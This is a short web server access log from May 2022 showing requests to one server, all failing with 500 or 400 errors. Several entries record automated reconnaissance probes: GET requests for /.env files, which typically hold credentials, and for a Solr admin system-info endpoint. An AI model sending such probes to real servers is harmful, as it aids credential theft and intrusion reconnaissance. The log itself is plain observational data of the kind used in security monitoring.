45.9.20.101 - - [10/May/2022:04:55:43 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [10/May/2022:05:53:11 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:05:53:11 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
119.18.1.27 - - [10/May/2022:05:58:29 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:05:58:29 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
188.166.87.67 - - [10/May/2022:05:58:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; Android 8.0.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
119.18.1.27 - - [10/May/2022:06:00:35 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:00:36 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:00:36 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:00:37 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:03:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:03:56 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:03:57 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:03:57 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
177.152.162.240 - - [10/May/2022:06:06:33 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
51.79.29.48 - - [10/May/2022:06:39:31 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:06:39:32 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
